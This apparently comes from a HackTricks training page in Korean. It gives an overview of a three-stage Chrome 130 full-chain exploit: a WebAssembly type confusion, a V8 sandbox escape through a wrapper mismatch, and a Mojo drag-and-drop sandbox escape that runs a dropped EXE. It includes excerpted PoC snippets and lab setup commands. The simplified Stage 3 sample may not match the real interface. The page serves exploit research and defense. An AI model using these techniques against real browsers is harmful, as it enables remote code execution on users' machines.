# Chrome Exploiting

{{#include ../banners/hacktricks-training.md}}

> 이 페이지는 연구 시리즈 **“101 Chrome Exploitation”**(Part-0 — Preface)을 기반으로 Google Chrome 130에 대한 현대적인 "full-chain" exploitation 워크플로우에 대한 높은 수준이면서도 **실용적인** 개요를 제공합니다.
> 목표는 pentesters와 exploit-developers가 자신의 연구를 위해 기술들을 재현하거나 적응시키는 데 필요한 최소한의 배경지식을 제공하는 것입니다.

## 1. Chrome Architecture Recap
공격 표면을 이해하려면 코드가 어디에서 실행되는지와 어떤 sandboxes가 적용되는지를 알아야 합니다.

<details>
<summary>Chrome process & sandbox layout</summary>
```text
+-------------------------------------------------------------------------+
|                             Chrome Browser                              |
|                                                                         |
|  +----------------------------+      +-----------------------------+    |
|  |      Renderer Process      |      |    Browser/main Process     |    |
|  |  [No direct OS access]     |      |  [OS access]                |    |
|  |  +----------------------+   |      |                             |    |
|  |  |    V8 Sandbox        |   |      |                             |    |
|  |  |  [JavaScript / Wasm] |   |      |                             |    |
|  |  +----------------------+   |      |                             |    |
|  +----------------------------+      +-----------------------------+    |
|               |           IPC/Mojo              |                       |
|               V                                    |                     |
|  +----------------------------+                   |                     |
|  |        GPU Process         |                   |                     |
|  |  [Restricted OS access]    |                   |                     |
|  +----------------------------+                   |                     |
+-------------------------------------------------------------------------+
```
</details>

다층 심층 방어(defence-in-depth):

* **V8 sandbox** (Isolate): 메모리 권한이 제한되어 JITed JS / Wasm로부터 임의의 읽기/쓰기를 방지합니다.
* **Renderer ↔ Browser split**은 **Mojo/IPC** 메시지 전달을 통해 보장됩니다; 렌더러는 네이티브 FS/네트워크 접근 권한이 *없음*.
* **OS sandboxes**는 각 프로세스를 추가로 격리합니다 (Windows Integrity Levels / `seccomp-bpf` / macOS sandbox profiles).

따라서 *원격* 공격자는 연속된 **세** 가지 프리미티브가 필요합니다:

1. V8 내부의 메모리 손상으로 **V8 힙 내부에서의 임의 RW**를 얻음.
2. 공격자가 **V8 sandbox를 벗어나 전체 렌더러 메모리**에 접근할 수 있게 하는 두 번째 버그.
3. 최종 sandbox 탈출(종종 메모리 손상이 아닌 논리적 취약점)으로 **Chrome OS sandbox 외부에서 코드 실행**.

---

## 2. 단계 1 – WebAssembly Type-Confusion (CVE-2025-0291)

TurboFan의 **Turboshaft** 최적화의 결함으로, 값이 *단일 기본 블록 루프* 내에서 생성되고 소비될 때 **WasmGC reference types**을 잘못 분류합니다.

영향:
* 컴파일러가 **타입 체크를 건너뛰어**, *reference* (`externref/anyref`)를 *int64*로 취급합니다.
* 조작된 Wasm은 JS 객체 헤더를 공격자가 제어하는 데이터와 겹치게 하여 → <code>addrOf()</code> & <code>fakeObj()</code> **AAW / AAR primitives** 을 가능하게 합니다.

최소 PoC (발췌):
```WebAssembly
(module
(type $t0 (func (param externref) (result externref)))
(func $f (param $p externref) (result externref)
(local $l externref)
block $exit
loop $loop
local.get $p      ;; value with real ref-type
;; compiler incorrectly re-uses it as int64 in the same block
br_if $exit       ;; exit condition keeps us single-block
br   $loop
end
end)
(export "f" (func $f)))
```
JS에서 최적화 트리거 및 spray objects:
```js
const wasmMod = new WebAssembly.Module(bytes);
const wasmInst = new WebAssembly.Instance(wasmMod);
const f = wasmInst.exports.f;

for (let i = 0; i < 1e5; ++i) f({});   // warm-up for JIT

// primitives
let victim   = {m: 13.37};
let fake     = arbitrary_data_backed_typedarray;
let addrVict = addrOf(victim);
```
Outcome: **arbitrary read/write within V8**.

---

## 3. Stage 2 – V8 Sandbox 탈출 (issue 379140430)

Wasm 함수가 tier-up-compiled되면, **JS ↔ Wasm wrapper**가 생성됩니다. A signature-mismatch bug로 인해, Wasm 함수가 스택에 남아 있는 상태에서 재-최적화될 때 wrapper가 신뢰된 **`Tuple2`** 객체의 끝을 넘어 쓰기를 하게 됩니다.

`Tuple2` 객체의 2 × 64-bit 필드를 덮어쓰면 Renderer process 내의 임의 주소에 대한 **read/write**가 가능해져 V8 sandbox를 사실상 우회합니다.

익스플로잇의 주요 단계:
1. turbofan/baseline 코드를 번갈아 사용해 함수가 **Tier-Up** 상태가 되게 합니다.
2. 스택에 레퍼런스를 유지한 채로 (`Function.prototype.apply`) tier-up을 트리거합니다.
3. Stage-1 AAR/AAW를 사용해 인접한 `Tuple2`를 찾아 손상시킵니다.

Wrapper identification:
```js
function wrapperGen(arg) {
return f(arg);
}
%WasmTierUpFunction(f);          // force tier-up (internals-only flag)
wrapperGen(0x1337n);
```
손상 이후 우리는 완전한 기능을 갖춘 **renderer R/W primitive**를 보유하게 됩니다.

---

## 4. 3단계 – Renderer → OS Sandbox Escape (CVE-2024-11114)

The **Mojo** IPC interface `blink.mojom.DragService.startDragging()`는 Renderer에서 *partially trusted* 매개변수로 호출될 수 있습니다. `DragData` 구조체를 **임의의 파일 경로**를 가리키도록 조작함으로써 Renderer는 브라우저가 *native* 드래그 앤 드롭을 **outside the renderer sandbox**에서 수행하도록 설득할 수 있습니다.

이를 악용하면 우리는 프로그래밍적으로 “drag”된 악성 EXE(사전에 world-writable 위치에 놓아둔)를 Desktop으로 옮길 수 있고, Windows는 파일이 떨어지면 특정 파일 형식을 자동으로 실행합니다.

Example (simplified):
```js
const payloadPath = "C:\\Users\\Public\\explorer.exe";

chrome.webview.postMessage({
type: "DragStart",
data: {
title: "MyFile",
file_path: payloadPath,
mime_type: "application/x-msdownload"
}
});
```
추가적인 메모리 손상은 필요하지 않습니다 – **논리적 결함**으로 사용자의 권한으로 임의의 파일 실행이 가능합니다.

---

## 5. 전체 체인 흐름

1. **사용자 방문** 악성 웹페이지.
2. **1단계**: Wasm module가 CVE-2025-0291을 악용 → V8 heap AAR/AAW.
3. **2단계**: Wrapper mismatch가 `Tuple2`를 손상시켜 → V8 sandbox 탈출.
4. **3단계**: `startDragging()` IPC → OS sandbox 탈출 & 페이로드 실행.

결과: **Remote Code Execution (RCE)** 호스트에서 (Chrome 130, Windows/Linux/macOS).

---

## 6. 실습 및 디버깅 설정
```bash
# Spin-up local HTTP server w/ PoCs
npm i -g http-server
git clone https://github.com/Petitoto/chromium-exploit-dev
cd chromium-exploit-dev
http-server -p 8000 -c -1

# Windows kernel debugging
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbgx.exe" -symbolpath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
```
Chrome의 *development* build을 실행할 때 유용한 flags:
```bash
chrome.exe --no-sandbox --disable-gpu --single-process --js-flags="--allow-natives-syntax"
```
## 7. Renderer → kernel 탈출 자원

렌더러 익스플로잇이 seccomp profile 내부에 머무는 kernel pivot을 필요로 할 때, sandbox 내부에서 여전히 접근 가능한 AF_UNIX `MSG_OOB` sockets를 남용하면 결정론적인 경로를 제공합니다. SKB UAF → kernel RCE chain에 대한 자세한 내용은 아래의 Linux kernel exploitation case-study를 확인하세요:

{{#ref}}
linux-kernel-exploitation/af-unix-msg-oob-uaf-skb-primitives.md
{{#endref}}

---

## 요점

* **WebAssembly JIT bugs**는 여전히 신뢰할 수 있는 진입점입니다 – 타입 시스템이 아직 성숙하지 않았습니다.
* V8 내부에서 두 번째 memory-corruption 버그(예: wrapper mismatch)를 얻으면 **V8-sandbox escape**가 훨씬 단순해집니다.
* 권한이 부여된 Mojo IPC 인터페이스의 로직 수준 약점은 종종 **final sandbox escape**에 충분합니다 – *non-memory* 버그에 주목하세요.



## References
- [101 Chrome Exploitation — Part 0 (Preface)](https://opzero.ru/en/press/101-chrome-exploitation-part-0-preface/)
- [Chromium security architecture](https://chromium.org/developers/design-documents/security)
{{#include ../banners/hacktricks-training.md}}
